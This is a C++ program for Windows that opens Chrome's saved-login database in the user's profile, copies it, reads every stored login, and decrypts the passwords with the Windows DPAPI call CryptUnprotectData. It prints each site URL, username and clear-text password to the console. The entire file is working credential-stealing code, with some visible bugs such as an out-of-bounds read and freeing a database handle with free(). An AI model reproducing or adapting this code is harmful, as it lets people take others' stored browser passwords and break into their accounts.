#include <Windows.h>
#include <iostream>
#include <string>
#include <stdio.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <vector>

#include <bcrypt.h>

#include <dpapi.h>
#include <sqlite3.h>
#pragma comment(lib, "H:\\Visual Studio Libraries\\Other\\sqlite3_src\\sqlite3.lib")
#pragma comment(lib, "Crypt32.lib")


#pragma comment(lib, "Shlwapi.lib")
void OpenLoginData();
void OnSQLError(sqlite3* sql);



int main()
{
    std::cout << "Hello World!\n";
	OpenLoginData();
}


void OpenLoginData()
{
	// Location
	// C:\Users\<uname>\AppData\Local\Google\Chrome\User Data\Default
	LPWSTR folderPath;
	folderPath = (LPWSTR)malloc(1024);

	if (folderPath == nullptr)
	{
		printf("[MALLOC] Error in folderPath\n");
		exit(0);
	}

	SHGetSpecialFolderPathW(NULL, folderPath, CSIDL_PROFILE, false);

	printf("[LoginData]: %ls\n", folderPath);

	lstrcatW(folderPath, L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
	printf("[FolderPath]: %ls\n", folderPath);

	if (!PathFileExistsW(folderPath))
	{
		printf("[Chrome] Login Data doesn't exist... GLE: 0x%08x\n", GetLastError());
		exit(0);
	}

	sqlite3* lData;


	CopyFile(folderPath, L"data.tmp", false);

	if (sqlite3_open("data.tmp", &lData) == SQLITE_OK)
	{

		std::string url = "[Chrome][originURL]: ";
		std::string username = "[Chrome][username_value]: ";
		std::string pass = "[Chrome][password_value]: ";
		printf("[SQLITE] Sucessfully opened Login Data...\n");

		sqlite3_stmt* loginStatement;
		if (sqlite3_prepare_v2(lData, "SELECT * FROM LOGINS;", 22, &loginStatement, NULL) == SQLITE_OK)
		{
			printf("[SQLITE] Statement prepped\n");

			const unsigned char* originURL = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);
			const unsigned char* username_val = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 256);
			while (true)
			{
				if (sqlite3_step(loginStatement) == SQLITE_ROW)
				{


					originURL = sqlite3_column_text(loginStatement, 0);
					username_val = sqlite3_column_text(loginStatement, 3);
					int len = sqlite3_column_bytes(loginStatement, 5);

					std::vector<byte> data(len);

					const byte* byteBuffer = reinterpret_cast<const byte*>(sqlite3_column_blob(loginStatement, 5));
					std::copy(byteBuffer, byteBuffer + data.size(), &data[0]);



					printf("%s %s\n", url.c_str(),originURL);
					printf("%s %s\n", username.c_str(),username_val);


					if (len != 0)
					{
						for (int x = 0; x <= len; x++)
						{
							printf("%02x ", byteBuffer[x]);
						}
						printf("\n");

						DATA_BLOB pwd;
						DATA_BLOB pwdOut;
						ZeroMemory(&pwd, sizeof(DATA_BLOB));
						ZeroMemory(&pwdOut, sizeof(DATA_BLOB));

						pwd.cbData = len;
						//memcpy_s(pwd.pbData, sizeof(passBlob), passBlob, sizeof(passBlob));
						pwd.pbData = data.data();
						CryptUnprotectData(&pwd, NULL, NULL, NULL, NULL, 1, &pwdOut);
						printf("%s %s\n", pass.c_str(), pwdOut.pbData);
					}
				}
				else
				{
					printf("[SQLITE] Failed to step statement\n");
					free(folderPath);
					OnSQLError(lData);
				}
			}
		}
		else
		{
			printf("[SQLITE] Failed to open LoginData\n");
			OnSQLError(lData);

		}


		free(lData);
	}	free(folderPath);
}


void OnSQLError(sqlite3* sql)
{
	printf("[SQLITE ERR] %s\n", sqlite3_errmsg(sql));
	sqlite3_close_v2(sql);
	exit(0);
}